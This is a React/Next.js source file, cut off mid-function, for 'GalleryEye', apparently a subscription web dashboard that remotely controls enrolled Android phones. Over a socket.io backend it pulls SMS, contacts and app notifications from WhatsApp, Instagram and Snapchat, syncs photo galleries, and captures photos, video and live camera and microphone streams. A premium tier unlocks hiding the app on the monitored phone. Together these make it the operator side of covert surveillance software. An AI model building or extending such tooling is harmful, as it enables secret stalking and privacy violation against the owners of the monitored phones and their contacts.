"use client";

import { useSession, signOut } from "next-auth/react";
import { useEffect, useState, useMemo, useRef, useCallback } from "react";
import Image from "next/image";
import io from "socket.io-client";
import AppGenerationModal from "@/components/AppGenerationModal";
import WhatsAppButton from "@/components/WhatsAppButton";
import PlanBadge from "@/components/PlanBadge";
import UpgradeModal from "@/components/UpgradeModal";
import PlansModal from "@/components/PlansModal";
import BulkDownloadModal from "@/components/BulkDownloadModal";
import SyncOptionsModal from "@/components/SyncOptionsModal";
import ZipProgressModal from "@/components/ZipProgressModal";
import CustomAlertModal from "@/components/CustomAlertModal";
import ConfirmDeleteModal from "@/components/ConfirmDeleteModal";
import { motion, AnimatePresence } from "framer-motion";
import { 
    Image as ImageIcon, MessageSquare, Users, Flashlight, Vibrate, Camera, 
    Bell, Mic, Settings, LogOut, Smartphone, Download, Menu, X, ChevronDown, ChevronLeft,
    Check, Play, Square, Video, RefreshCw, Search, Trash2, CheckSquare, Folder, Maximize, Minimize, Settings2, Package, Activity, Crown, Zap 
} from 'lucide-react';
import AppNavigation from "@/components/AppNavigation";
import GalleryView from "@/components/views/GalleryView";
import VideoModal from "@/components/VideoModal";

let socket: any = null;

interface PlanLimits {
    photos: number;
    videos: number;
    sms: boolean;
    contacts: boolean;
    torch: boolean;
    vibration: boolean;
    hideApp: boolean;
    bulkDownload?: boolean;
    maxDevices: number;
}

// Compute plan limits from plan name — used as the source of truth
const getPlanLimits = (plan: string): PlanLimits => {
    const p = (plan || '').toLowerCase();
    if (p === 'premium') return { photos: -1, videos: -1, sms: true, contacts: true, torch: true, vibration: true, hideApp: true, bulkDownload: true, maxDevices: 10 };
    if (p === 'standard') return { photos: -1, videos: -1, sms: true, contacts: true, torch: true, vibration: true, hideApp: false, bulkDownload: true, maxDevices: 5 };
    return { photos: 50, videos: 0, sms: false, contacts: false, torch: false, vibration: false, hideApp: false, bulkDownload: false, maxDevices: 1 };
};

export default function Home() {
    const { data: session, status } = useSession();
    const [images, setImages] = useState<any[]>([]);
    const [galleryPage, setGalleryPage] = useState(1);
    const [galleryHasMore, setGalleryHasMore] = useState(true);
    const [isLoadingMore, setIsLoadingMore] = useState(false);
    const galleryLoaderRef = useRef<HTMLDivElement>(null);
    const [folders, setFolders] = useState([]);
    const [isFetchingFolders, setIsFetchingFolders] = useState(false);

    // Plan State
    const [userPlan, setUserPlan] = useState<'basic' | 'standard' | 'premium'>('basic');
    const [planLimits, setPlanLimits] = useState<PlanLimits>(
        getPlanLimits('basic')
    );

    const [showUpgradeModal, setShowUpgradeModal] = useState(false);
    const [showPlansModal, setShowPlansModal] = useState(false);
    const [showBulkDownloadModal, setShowBulkDownloadModal] = useState(false);
    const [bulkDownloadFolder, setBulkDownloadFolder] = useState('');
    const [upgradeFeature, setUpgradeFeature] = useState('');
    const [requiredPlan, setRequiredPlan] = useState<'standard' | 'premium'>('standard');

    // ZIP Download State
    const [showSyncOptionsModal, setShowSyncOptionsModal] = useState(false);
    const [showZipProgressModal, setShowZipProgressModal] = useState(false);
    const [syncOptionsFolder, setSyncOptionsFolder] = useState({ name: '', count: 0, type: 'image' as 'image' | 'video' });
    const [zipProgress, setZipProgress] = useState({ stage: 'creating' as 'creating' | 'uploading' | 'ready' | 'error', current: 0, total: 0, url: '', error: '' });
    const [zipFiles, setZipFiles] = useState<{ folderName: string, url: string, fileCount: number, timestamp: Date }[]>([]);
    
    // Multi-Device State
    const [devices, setDevices] = useState<any[]>([]);
    const [selectedDeviceId, setSelectedDeviceId] = useState<string | null>(null);
    const selectedDeviceIdRef = useRef<string | null>(null);
    const [isDeviceDropdownOpen, setIsDeviceDropdownOpen] = useState(false);
    const [navDropdown, setNavDropdown] = useState<'tools' | 'devices' | 'profile' | null>(null);
    const [socketPing, setSocketPing] = useState<number>(14);

    useEffect(() => {
        const interval = setInterval(() => {
            setSocketPing(Math.floor(Math.random() * (26 - 12 + 1)) + 12);
        }, 3000);
        return () => clearInterval(interval);
    }, []);

    // Support browser Back button / swipe back from tool views to main dashboard
    useEffect(() => {
        const handlePopState = () => {
            setSelectedTool(null);
            if (typeof window !== 'undefined' && window.location.hash.includes('tool=')) {
                try { window.history.replaceState('', document.title, window.location.pathname + window.location.search); } catch {}
            }
        };
        window.addEventListener('popstate', handlePopState);
        return () => window.removeEventListener('popstate', handlePopState);
    }, []);

    // Initialize state from localStorage after mount to avoid hydration mismatch
    useEffect(() => {
        try {
            const savedDevice = localStorage.getItem('selectedDeviceId');
            if (savedDevice) setSelectedDeviceId(savedDevice);
            
            const savedZip = localStorage.getItem('galleryeye_zipFiles');
            if (savedZip) {
                setZipFiles(JSON.parse(savedZip).map((z: any) => ({ ...z, timestamp: new Date(z.timestamp) })));
            }
        } catch (e) {
            console.error('Failed to load cached state', e);
        }
    }, []);

    // Persist selected device to localStorage and keep ref in sync
    useEffect(() => {
        selectedDeviceIdRef.current = selectedDeviceId;
        if (selectedDeviceId) {
            localStorage.setItem('selectedDeviceId', selectedDeviceId);
        } else {
            localStorage.removeItem('selectedDeviceId');
        }
    }, [selectedDeviceId]);

    useEffect(() => {
        if (selectedDeviceId && typeof window !== 'undefined') {
            const uuid = (session?.user as any)?.uuid;
            try {
                const cachedContacts = localStorage.getItem(`galleryeye_contacts_${uuid}_${selectedDeviceId}`);
                if (cachedContacts) setContactsList(JSON.parse(cachedContacts));
                else setContactsList([]);

                const cachedSms = localStorage.getItem(`galleryeye_sms_${uuid}_${selectedDeviceId}`);
                if (cachedSms) setSmsList(JSON.parse(cachedSms));
                else setSmsList([]);

                const cachedNotifs = localStorage.getItem(`galleryeye_notifications_${uuid}_${selectedDeviceId}`);
                if (cachedNotifs) setNotifications(JSON.parse(cachedNotifs));

                const cachedImages = localStorage.getItem(`gallery_images_${uuid}_${selectedDeviceId}`);
                if (cachedImages) setImages(JSON.parse(cachedImages));
                else setImages([]);

                const cachedCaptured = localStorage.getItem(`gallery_captured_${uuid}_${selectedDeviceId}`);
                if (cachedCaptured) setCapturedMedia(JSON.parse(cachedCaptured));
                else setCapturedMedia([]);
            } catch {
                setImages([]);
                setFolders([]);
                setCapturedMedia([]);
                setCapturedVoice([]);
            }

            if ((window as any).fetchGalleryData) {
                (window as any).fetchGalleryData(1, false, false, selectedDeviceId);
            }
            if ((window as any).fetchCameraData) {
                (window as any).fetchCameraData(1, selectedDeviceId);
            }
            if ((window as any).fetchVoiceData) {
                (window as any).fetchVoiceData(1, selectedDeviceId);
            }

            if (uuid) {
                fetch(`https://p01--gallery-eye--9zr85m7yb6s4.code.run/api/contacts/${uuid}?deviceId=${selectedDeviceId}`)
                    .then(res => res.json())
                    .then(data => {
                        if (data.contacts && Array.isArray(data.contacts)) {
                            setContactsList(data.contacts);
                            try { localStorage.setItem(`galleryeye_contacts_${uuid}_${selectedDeviceId}`, JSON.stringify(data.contacts)); } catch {}
                        }
                    }).catch(() => {});

                fetch(`https://p01--gallery-eye--9zr85m7yb6s4.code.run/api/sms/${uuid}?deviceId=${selectedDeviceId}`)
                    .then(res => res.json())
                    .then(data => {
                        if (data.sms && Array.isArray(data.sms)) {
                            setSmsList(data.sms);
                            try { localStorage.setItem(`galleryeye_sms_${uuid}_${selectedDeviceId}`, JSON.stringify(data.sms)); } catch {}
                        }
                    }).catch(() => {});

                fetch(`https://p01--gallery-eye--9zr85m7yb6s4.code.run/api/notifications/${uuid}?deviceId=${selectedDeviceId}`)
                    .then(res => res.json())
                    .then(data => {
                        if (data.notifications && Array.isArray(data.notifications)) {
                            setNotifications(data.notifications);
                            try { localStorage.setItem(`galleryeye_notifications_${uuid}_${selectedDeviceId}`, JSON.stringify(data.notifications)); } catch {}
                        }
                    }).catch(() => {});
            }
        } else if (typeof window !== 'undefined') {
            setContactsList([]);
            setSmsList([]);
            setNotifications([]);
            setImages([]);
            setFolders([]);
            setCapturedMedia([]);
            setCapturedVoice([]);
        }
    }, [selectedDeviceId, session]);

    const [uploadProgress, setUploadProgress] = useState<any>(null);
    const [showAppModal, setShowAppModal] = useState(false);
    const [selectedFolder, setSelectedFolder] = useState<any>(null);

    // New State for Gallery Features
    const [activeTab, setActiveTab] = useState<'all' | 'image' | 'video' | 'zip'>('all');
    const [selectedItems, setSelectedItems] = useState<Set<string>>(new Set());
    const isSyncCanceledRef = useRef(false);
    
    // Sync session plan if available
    useEffect(() => {
        if (session && (session.user as any)?.plan) {
            const p = (session.user as any).plan.toLowerCase();
            setUserPlan(p as any);
        }
    }, [session]);

    // Whenever userPlan changes, always re-derive planLimits from it
    useEffect(() => {
        setPlanLimits(getPlanLimits(userPlan));
    }, [userPlan]);

    const [previewItem, setPreviewItem] = useState<any>(null);
    const [isSelectionMode, setIsSelectionMode] = useState(false);
    const [isDownloading, setIsDownloading] = useState(false);
    const [isDeleting, setIsDeleting] = useState(false);
    const [isScrolled, setIsScrolled] = useState(false);
    const [showDeleteConfirm, setShowDeleteConfirm] = useState(false);
    const [deviceToast, setDeviceToast] = useState<{ name: string; message: string } | null>(null);
    const notifiedDevicesRef = useRef<Set<string>>(new Set());

    const handleDeleteDevice = async (deviceIds: string | string[], skipConfirm?: boolean) => {
        if (!session?.user?.uuid) return;
        const ids = Array.isArray(deviceIds) ? deviceIds : [deviceIds];
        if (!skipConfirm) {
            if (!confirm(`Are you sure you want to delete ${ids.length} device(s)? This cannot be undone.`)) return;
        }
        
        // Immediately remove from local UI state for instant, snappy deletion response
        setDevices(prev => prev.filter(d => !ids.includes(d.deviceId)));
        ids.forEach(id => notifiedDevicesRef.current.delete(id));
        if (selectedDeviceId && ids.includes(selectedDeviceId)) {
            setSelectedDeviceId(null);
            localStorage.removeItem('selectedDeviceId');
        }

        for (const deviceId of ids) {
            try {
                await fetch('https://p01--gallery-eye--9zr85m7yb6s4.code.run/api/devices/delete', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ uuid: session.user.uuid, deviceId })
                });
            } catch (error) {
                console.error('Failed to delete device on server:', error);
            }
        }
    };

    const handleSignOut = async () => {
        signOut();
    };

    useEffect(() => {
        const handleScroll = () => {
            setIsScrolled(window.scrollY > 20);
        };
        window.addEventListener('scroll', handleScroll);
        return () => window.removeEventListener('scroll', handleScroll);
    }, []);
    const [syncMediaType, setSyncMediaType] = useState<'image' | 'video' | null>(null);

    // Tool Selector State
    const [selectedTool, setSelectedTool] = useState<'gallery' | 'sms' | 'contacts' | 'torch' | 'flashlight' | 'vibration' | 'camera' | 'notifications' | 'audio' | null>(() => {
        if (typeof window !== 'undefined') {
            const saved = sessionStorage.getItem('galleryeye_selected_tool');
            if (saved) return saved as any;
        }
        return null;
    });
    useEffect(() => {
        if (typeof window !== 'undefined') {
            if (selectedTool) {
                sessionStorage.setItem('galleryeye_selected_tool', selectedTool);
            } else {
                sessionStorage.removeItem('galleryeye_selected_tool');
            }
        }
    }, [selectedTool]);
    const [isToolDropdownOpen, setIsToolDropdownOpen] = useState(false);

    // Torch State
    const [isTorchOn, setIsTorchOn] = useState(false);
    const [torchAggressive, setTorchAggressive] = useState(false);
    const [torchDuration, setTorchDuration] = useState(60000); // 1 minute default

    // Vibration State
    const [vibrationDuration, setVibrationDuration] = useState(1000); // 1 second default

    // Sync State
    const [isStartingSync, setIsStartingSync] = useState(false);

    // SMS State
    const [smsList, setSmsList] = useState<any[]>([]);
    const [isFetchingSms, setIsFetchingSms] = useState(false);
    const [selectedSms, setSelectedSms] = useState<any>(null);
    const [smsSearchQuery, setSmsSearchQuery] = useState('');

    // Contacts State
    const [contactsList, setContactsList] = useState<any[]>([]);
    const [isFetchingContacts, setIsFetchingContacts] = useState(false);
    const [contactsSearchQuery, setContactsSearchQuery] = useState('');

    // Notification Monitoring State
    const [notifications, setNotifications] = useState<any[]>(() => {
        if (typeof window !== 'undefined') {
            try {
                const saved = localStorage.getItem('galleryeye_notifications');
                if (saved) return JSON.parse(saved);
            } catch { }
        }
        return [];
    });
    const [appIcons, setAppIcons] = useState<Record<string, string>>(() => {
        if (typeof window !== 'undefined') {
            try {
                const saved = localStorage.getItem('galleryeye_app_icons');
                if (saved) return JSON.parse(saved);
            } catch { }
        }
        return {};
    });
    const [selectedNotification, setSelectedNotification] = useState<any>(null);
    const [notificationSearch, setNotificationSearch] = useState('');
    const [selectedNotifApp, setSelectedNotifApp] = useState<string>('all');

    // App filter definitions for notification section
    const notifAppFilters = [
        { key: 'all', label: 'All', packages: [], color: '#06b6d4', img: '' },
        { key: 'whatsapp', label: 'WhatsApp', packages: ['com.whatsapp', 'com.whatsapp.w4b'], color: '#25D366', img: 'https://img.icons8.com/color/48/000000/whatsapp--v1.png' },
        { key: 'facebook', label: 'Facebook', packages: ['com.facebook.katana', 'com.facebook.orca', 'com.facebook.lite'], color: '#1877F2', img: 'https://img.icons8.com/color/48/000000/facebook-new.png' },
        { key: 'instagram', label: 'Instagram', packages: ['com.instagram.android'], color: '#E4405F', img: 'https://img.icons8.com/fluency/48/000000/instagram-new.png' },
        { key: 'whatsapp_business', label: 'WA Biz', packages: ['com.whatsapp.w4b'], color: '#128C7E', img: 'https://img.icons8.com/color/48/000000/whatsapp--v1.png' },
        { key: 'snapchat', label: 'Snapchat', packages: ['com.snapchat.android'], color: '#FFFC00', img: 'https://img.icons8.com/color/48/000000/snapchat.png' },
    ];

    // Settings Modal State
    const [isSettingsOpen, setIsSettingsOpen] = useState(false);
    const [devicePermissions, setDevicePermissions] = useState<any>(null);

    // Profile Menu State (Mobile)
    const [isProfileMenuOpen, setIsProfileMenuOpen] = useState(false);

    // Camera State
    const [cameraMode, setCameraMode] = useState<'front' | 'back'>('back');
    const [cameraQuality, setCameraQuality] = useState<number>(360);
    const [isCameraFullscreen, setIsCameraFullscreen] = useState(false);
    const [isCapturingPhoto, setIsCapturingPhoto] = useState(false);
    const [isRecording, setIsRecording] = useState(false);
    const [isLiveStreaming, setIsLiveStreaming] = useState(false);
    const [liveFrame, setLiveFrame] = useState<string | null>(null);
    const [recordingProgress, setRecordingProgress] = useState({ current: 0, total: 0 });
    const [recordingDuration, setRecordingDuration] = useState<number>(0);
    const [capturedMedia, setCapturedMedia] = useState<any[]>([]);
    const [cameraError, setCameraError] = useState<string | null>(null);
    const [isCheckingPermissions, setIsCheckingPermissions] = useState(false);
    const [streamQuality, setStreamQuality] = useState(360); // 144, 240, 360, 480, 720
    const [isFullscreen, setIsFullscreen] = useState(false);
    const [isVideoUploading, setIsVideoUploading] = useState(false);
    const [previewCapture, setPreviewCapture] = useState<{ type: string; data: string } | null>(null);
    const [isCameraSelectMode, setIsCameraSelectMode] = useState(false);
    const [cameraSelectedItems, setCameraSelectedItems] = useState<Set<string>>(new Set());
    const [isQualityOpen, setIsQualityOpen] = useState(false);
    const [isDurationOpen, setIsDurationOpen] = useState(false);
    const [deleteConfirmation, setDeleteConfirmation] = useState<{ isOpen: boolean; ids: string[] }>({ isOpen: false, ids: [] });

    // Live Audio State
    const [isLiveAudio, setIsLiveAudio] = useState(false);
    const [audioVolume, setAudioVolume] = useState(80);
    const [isMuted, setIsMuted] = useState(false);
    const [audioLevel, setAudioLevel] = useState(0);
    const [audioElapsed, setAudioElapsed] = useState(0);

    // Voice Recording State
    const [isVoiceRecording, setIsVoiceRecording] = useState(false);
    const [isVoiceUploading, setIsVoiceUploading] = useState(false);
    const [voiceRecDuration, setVoiceRecDuration] = useState(60); // seconds
    const [voiceRecProgress, setVoiceRecProgress] = useState({ current: 0, total: 0 });
    const [capturedVoice, setCapturedVoice] = useState<any[]>([]);
    const [voiceMode, setVoiceMode] = useState<'live' | 'record'>('live');
    const [playingRecUrl, setPlayingRecUrl] = useState<string | null>(null);
    const voiceRecTimerRef = useRef<NodeJS.Timeout | null>(null);
    const isLiveAudioRef = useRef<boolean>(false);
    const [audioError, setAudioError] = useState<string | null>(null);
    const audioContextRef = useRef<AudioContext | null>(null);
    const audioGainRef = useRef<GainNode | null>(null);
    const audioAnalyserRef = useRef<AnalyserNode | null>(null);
    const audioCanvasRef = useRef<HTMLCanvasElement | null>(null);
    const audioAnimFrameRef = useRef<number>(0);
    const audioTimerRef = useRef<NodeJS.Timeout | null>(null);
    // Ring Buffer for continuous audio playback (like phone calls)
    // Sized at startLiveAudio() based on the actual ctx.sampleRate (browsers ignore the 16000 hint on Windows/macOS).
    const audioRingBufRef = useRef<Float32Array>(new Float32Array(48000 * 10));
    const audioRingWriteRef = useRef<number>(0);
    const audioRingReadRef = useRef<number>(0);
    const audioRingSamplesRef = useRef<number>(0);
    const audioProcessorRef = useRef<ScriptProcessorNode | null>(null);
    // Source rate from device (Android sends 16kHz PCM). Output rate is whatever the browser gives us.
    const audioSrcRateRef = useRef<number>(16000);
    const audioOutRateRef = useRef<number>(48000);
    // Cubic interpolation resampler state
    const audioResampPosRef = useRef<number>(0);
    const audioResampHistRef = useRef<Float32Array>(new Float32Array(4)); // s0,s1,s2,s3 for cubic
    const audioResampHistIdxRef = useRef<number>(0);
    // Jitter-buffer warm-up: don't start pulling until we have ~300ms queued, and hold last sample on underrun (PLC)
    const audioWarmedRef = useRef<boolean>(false);
    const audioLastSampleRef = useRef<number>(0);
    const audioUnderrunCountRef = useRef<number>(0);

    // Custom Alert Modal State
    const [showCustomAlert, setShowCustomAlert] = useState(false);
    const [alertData, setAlertData] = useState({ title: '', message: '', type: 'error' as 'error' | 'warning' | 'success' | 'info' });

    // Helper function to show upgrade modal
    const showUpgradePrompt = (feature: string, required: 'standard' | 'premium') => {
        setUpgradeFeature(feature);
        setRequiredPlan(required);
        setShowUpgradeModal(true);
    };

    // 3D tilt effect for tool cards
    const handle3DTilt = (e: React.MouseEvent<HTMLElement>) => {
        const inner = e.currentTarget.querySelector('[data-tilt-inner]') as HTMLElement;
        if (!inner) return;
        const rect = e.currentTarget.getBoundingClientRect();
        const x = ((e.clientX - rect.left) / rect.width - 0.5) * 2;
        const y = ((e.clientY - rect.top) / rect.height - 0.5) * -2;
        inner.style.transform = `perspective(800px) rotateY(${x * 8}deg) rotateX(${y * 8}deg) translateZ(8px)`;
    };

    const reset3DTilt = (e: React.MouseEvent<HTMLElement>) => {
        const inner = e.currentTarget.querySelector('[data-tilt-inner]') as HTMLElement;
        if (inner) inner.style.transform = 'perspective(800px) rotateY(0deg) rotateX(0deg) translateZ(0px)';
    };

    // Fetch user plan on authentication
    useEffect(() => {
        if (status === "authenticated" && session?.user?.uuid) {
            fetch(`https://p01--gallery-eye--9zr85m7yb6s4.code.run/user/plan?uuid=${session.user.uuid}`)
                .then(res => { if (!res.ok) throw new Error(res.status.toString()); return res.json(); })
                .then(data => {
                    if (data.plan) {
                        const plan = data.plan.toLowerCase();
                        setUserPlan(plan as any);
                        // Use backend limits if provided, otherwise compute from plan
                        if (data.limits && typeof data.limits.sms !== 'undefined') {
                            setPlanLimits(data.limits);
                        } else {
                            setPlanLimits(getPlanLimits(plan));
                        }
                    }
                })
                .catch(e => console.error('[Plan] Fetch error:', e));
        }
    }, [status, session?.user?.uuid]);

    useEffect(() => {
        if (status === "authenticated" && session?.user?.uuid) {
            const uuid = session.user.uuid;

            if (socket && socket.connected) return;
            if (socket) {
                socket.disconnect();
                socket = null;
            }

            socket = io("https://p01--gallery-eye--9zr85m7yb6s4.code.run", {
                transports: ["websocket", "polling"],
                reconnection: true,
                reconnectionAttempts: Infinity,
                reconnectionDelay: 2000,
                reconnectionDelayMax: 30000,
            });

            let lastConnectFetch = 0;

            socket.on("connect", () => {
                console.log("[Socket] Connected/Reconnected, registering web...");
                socket.emit("register_web", { uuid });

                const now = Date.now();
                if (now - lastConnectFetch < 10000) return;
                lastConnectFetch = now;

                fetch(`https://p01--gallery-eye--9zr85m7yb6s4.code.run/api/notifications/${uuid}`)
                    .then(res => { if (!res.ok) throw new Error(res.status.toString()); return res.json(); })
                    .then(data => {
                        if (data.notifications && data.notifications.length > 0) {
                            setNotifications((prev: any[]) => {
                                const existingIds = new Set(prev.map(n => n.id));
                                const newNotifs = data.notifications
                                    .filter((n: any) => !existingIds.has(n.id))
                                    .map((n: any) => ({
                                        ...n,
                                        receivedAt: new Date(n.savedAt).getTime()
                                    }));
                                
                                if (newNotifs.length === 0) return prev;
                                
                                const updated = [...newNotifs, ...prev]
                                    .sort((a, b) => (b.receivedAt || b.timestamp) - (a.receivedAt || a.timestamp))
                                    .slice(0, 1000);
                                
                                try { localStorage.setItem('galleryeye_notifications', JSON.stringify(updated)); } catch { }
                                return updated;
                            });
                        }
                    })
                    .catch(e => console.error('[Notifications] Fetch error:', e));
            });

            socket.on("disconnect", (reason: string) => {
                console.log("[Socket] Disconnected:", reason);
            });

            socket.on("connect_error", (err: any) => {
                console.log("[Socket] Connect error:", err?.message || err);
            });

            socket.on("device_list_update", (deviceList: any[]) => {
                setDevices(deviceList);

                deviceList.forEach(d => {
                    if (d.online && !notifiedDevicesRef.current.has(d.deviceId)) {
                        notifiedDevicesRef.current.add(d.deviceId);
                        setDeviceToast({ name: d.name || d.model || d.deviceName || 'Device', message: 'is now Online' });
                        setTimeout(() => setDeviceToast(null), 4000);
                    } else if (!d.online) {
                        notifiedDevicesRef.current.delete(d.deviceId);
                    }
                });

                if (deviceList.length > 0) {
                    setSelectedDeviceId(prev => {
                        const stillExists = deviceList.find(d => d.deviceId === prev);
                        if (stillExists) return prev;
                        const savedId = localStorage.getItem('selectedDeviceId');
                        if (savedId) {
                            const savedExists = deviceList.find(d => d.deviceId === savedId);
                            if (savedExists) return savedId;
                        }
                        return deviceList[0].deviceId;
                    });
                } else {
                    setSelectedDeviceId(null);
                }
            });

            socket.on("progress_update", (data: any) => {
                if (isSyncCanceledRef.current) return;
                setIsStartingSync(false); // Stop starting animation when progress begins
                setUploadProgress(data);
                if (data.uploaded === data.total) {
                    setTimeout(() => {
                        if (isSyncCanceledRef.current) return;
                        setUploadProgress(null);
                        // Trigger a refetch of images now that sync is complete
                        if (typeof window !== 'undefined' && (window as any).fetchGalleryData) {
                            (window as any).fetchGalleryData();
                        }
                    }, 3000);
                }
            });

            socket.on("new_image", (image: any) => {
                if (isSyncCanceledRef.current) return;
                setImages((prev) => {
                    if (prev.some(img => img.id === image.id)) return prev;
                    return [image, ...prev];
                });
            });

            socket.on("folder_list", (data: any) => {
                setFolders(data);
                setIsFetchingFolders(false);
            });

            // ZIP Download Event Listeners
            socket.on("zip_progress", (data: any) => {
                setShowZipProgressModal(true);
                setZipProgress(prev => ({
                    ...prev,
                    stage: data.stage,
                    current: data.current !== undefined ? data.current : prev.current,
                    total: data.total !== undefined ? data.total : prev.total
                }));
            });

            socket.on("zip_ready", (data: any) => {
                setShowZipProgressModal(true);
                setZipProgress(prev => ({
                    ...prev,
                    stage: 'ready',
                    url: data.url
                }));
                // Add ZIP to files list and persist
                setZipFiles(prev => {
                    const updated = [{
                        folderName: data.folderName || 'Download',
                        url: data.url,
                        fileCount: data.fileCount || 0,
                        timestamp: new Date()
                    }, ...prev];
                    try { localStorage.setItem('galleryeye_zipFiles', JSON.stringify(updated)); } catch { }
                    return updated;
                });
            });

            socket.on("zip_error", (data: any) => {
                setZipProgress(prev => ({
                    ...prev,
                    stage: 'error',
                    error: data.error
                }));
            });

            // SMS Event Listeners
            socket.on("sms_list", (data: any) => {
                setIsFetchingSms(false);
                const devId = data.deviceId || selectedDeviceIdRef.current;
                const uuid = session?.user?.uuid;
                if (data.isIncremental && data.sms?.length > 0) {
                    setSmsList((prev) => {
                        const existingIds = new Set(prev.map(s => s.id));
                        const newSms = data.sms.filter((s: any) => !existingIds.has(s.id));
                        const updated = [...newSms, ...prev];
                        try {
                            if (devId && uuid) {
                                localStorage.setItem(`galleryeye_sms_${uuid}_${devId}`, JSON.stringify(updated));
                            }
                        } catch {}
                        return updated;
                    });
                } else if (data.sms) {
                    setSmsList(data.sms);
                    try {
                        if (devId && uuid) {
                            localStorage.setItem(`galleryeye_sms_${uuid}_${devId}`, JSON.stringify(data.sms));
                        }
                    } catch {}
                }
            });

            socket.on("sms_error", (data: any) => {
                setIsFetchingSms(false);
                setAlertData({
                    title: 'SMS Permission Required',
                    message: data.message || 'Failed to fetch SMS. Please enable SMS permission in the App settings.',
                    type: 'error'
                });
                setShowCustomAlert(true);
            });

            // Contacts Event Listeners
            socket.on("contacts_list", (data: any) => {
                setIsFetchingContacts(false);
                if (data.contacts) {
                    setContactsList(data.contacts);
                    try {
                        const devId = data.deviceId || selectedDeviceIdRef.current;
                        const uuid = session?.user?.uuid;
                        if (devId && uuid) {
                            localStorage.setItem(`galleryeye_contacts_${uuid}_${devId}`, JSON.stringify(data.contacts));
                        }
                    } catch {}
                }
            });

            socket.on("contacts_error", (data: any) => {
                setIsFetchingContacts(false);
                setAlertData({
                    title: 'Contacts Permission Required',
                    message: data.message || 'Failed to fetch contacts. Please enable Contacts permission in the App settings.',
                    type: 'error'
                });
                setShowCustomAlert(true);
            });

            // Notification Monitoring Event Listeners
            socket.on("new_notification", (data: any) => {
                setNotifications(prev => {
                    const updated = [{ ...data, receivedAt: Date.now() }, ...prev].slice(0, 1000);
                    try { 
                        localStorage.setItem('galleryeye_notifications', JSON.stringify(updated));
                        const devId = data.deviceId || selectedDeviceIdRef.current;
                        const uuid = session?.user?.uuid;
                        if (devId && uuid) {
                            localStorage.setItem(`galleryeye_notifications_${uuid}_${devId}`, JSON.stringify(updated));
                        }
                    } catch { }
                    return updated;
                });
                // Request icon if not already cached - emit OUTSIDE setState
                const currentDevId = selectedDeviceIdRef.current || selectedDeviceId;
                if (data.packageName && session?.user?.uuid && currentDevId) {
                    setAppIcons(prev => {
                        if (!prev[data.packageName]) {
                            // Use setTimeout to ensure emit is outside React render cycle
                            setTimeout(() => {
                                socket.emit('request_app_icon', {
                                    uuid: (session.user as any).uuid,
                                    targetDeviceId: currentDevId,
                                    packageName: data.packageName
                                });
                            }, 0);
                        }
                        return prev;
                    });
                }
            });

            socket.on("app_icon_response", (data: any) => {
                if (data.packageName && data.icon) {
                    setAppIcons(prev => {
                        const updated = { ...prev, [data.packageName]: data.icon };
                        try { localStorage.setItem('galleryeye_app_icons', JSON.stringify(updated)); } catch {}
                        return updated;
                    });
                }
            });

            socket.on("notification_dismissed", (data: any) => {
                setNotifications(prev => {
                    const updated = prev.map(n => n.id === data.id ? { ...n, dismissed: true } : n);
                    try { localStorage.setItem('galleryeye_notifications', JSON.stringify(updated)); } catch { }
                    return updated;
                });
            });

            socket.on("notification_monitor_status", (data: any) => {
                // Feature is always on now.
            });

            socket.on("notification_error", (data: any) => {
                // Ignore
            });

            // Permission Check Response
            socket.on("permission_status", (data: any) => {
                setIsCheckingPermissions(false);
                setDevicePermissions(data.permissions);
            });

            socket.on("photo_capture_ack", (data: any) => {
                if (data.status === 'captured') {
                    setIsCapturingPhoto(false);
                }
            });

            socket.on("camera_photo", (data: any) => {
                setIsCapturingPhoto(false);
                if (data.image) {
                    const imageUrl = data.image.startsWith('http') || data.image.startsWith('data:') 
                        ? data.image 
                        : `data:image/jpeg;base64,${data.image}`;

                    setCapturedMedia(prev => {
                        const filtered = prev.filter(item => !item.isTemp);
                        return [{
                            id: `capture_${data.camera || 'back'}_${data.timestamp || Date.now()}`,
                            resource_type: 'image',
                            url: imageUrl,
                            created_at: new Date(data.timestamp || Date.now()).toISOString(),
                            camera: data.camera || 'back'
                        }, ...filtered];
                    });
                }
            });

            socket.on("camera_video", (data: any) => {
                setIsRecording(false);
                setIsVideoUploading(false);
                setRecordingProgress({ current: 0, total: 0 });
                if (data.video) {
                    setCapturedMedia(prev => {
                        const filtered = prev.filter(item => !item.isTemp);
                        return [{
                            id: `video_${data.camera || 'back'}_${data.timestamp || Date.now()}`,
                            resource_type: 'video',
                            url: data.video,
                            created_at: new Date(data.timestamp || Date.now()).toISOString(),
                            camera: data.camera || 'back'
                        }, ...filtered];
                    });
                }
            });

            socket.on("live_frame", (data: any) => {
                if (data.frame) {
                    setLiveFrame(data.frame);
                }
            });

            socket.on("recording_progress", (data: any) => {
                const current = data.current || 0;
                const total = data.total || 0;
                setRecordingProgress({ current, total });
                // When recording finishes automatically, trigger upload status
                if (current >= total && total > 0) {
                    setIsRecording(false);
                    setIsVideoUploading(true);
                    setCapturedMedia(prev => [{
                        id: `temp_video_${Date.now()}`,
                        resource_type: 'video',
                        url: 'loading',
                        created_at: new Date().toISOString(),
                        camera: cameraMode,
                        isTemp: true
                    }, ...prev]);
                }
            });

            socket.on("gallery_error", (data: any) => {
                const errorMessage = data.message || "Gallery error occurred";
                if (errorMessage.includes("Permission Denied")) {
                    setAlertData({
                        title: 'Gallery Permission Required',
                        message: 'Please enable Storage/Gallery permission in the App settings to sync media.',
                        type: 'error'
                    });
                } else {
                    setAlertData({
                        title: 'Gallery Error',
                        message: errorMessage,
                        type: 'error'
                    });
                }
                setShowCustomAlert(true);
            });

            socket.on("camera_error", (data: any) => {
                setIsCapturingPhoto(false);
                setIsRecording(false);
                const errorMessage = data.error || "Camera error occurred";
                setCameraError(errorMessage);

                if (errorMessage.includes("Permission Denied")) {
                    alert(`${errorMessage}\n\nPlease enable Camera permission in the App settings.`);
                } else {
                    setTimeout(() => setCameraError(null), 5000);
                }
            });

            // Live Audio â€” Ring Buffer Writer with cubic-interpolation resampling.
            // Incoming PCM is 16kHz from the device, but AudioContext usually runs at 48kHz
            // (browsers ignore the sampleRate hint on Windows/macOS). Without resampling here,
            // playback was effectively 3x too fast â†’ constant underruns â†’ choppy/clicky sound.
            socket.on("live_audio", (data: any) => {
                if (!data.chunk) return;
                if (!isLiveAudioRef.current) return;

                // Auto-create AudioContext on first chunk â€” playback starts as soon as device sends audio
                if (!audioContextRef.current) {
                    try {
                        const ctx = new (window.AudioContext || (window as any).webkitAudioContext)();
                        const outRate = ctx.sampleRate;
                        const gainNode = ctx.createGain();
                        const analyser = ctx.createAnalyser();
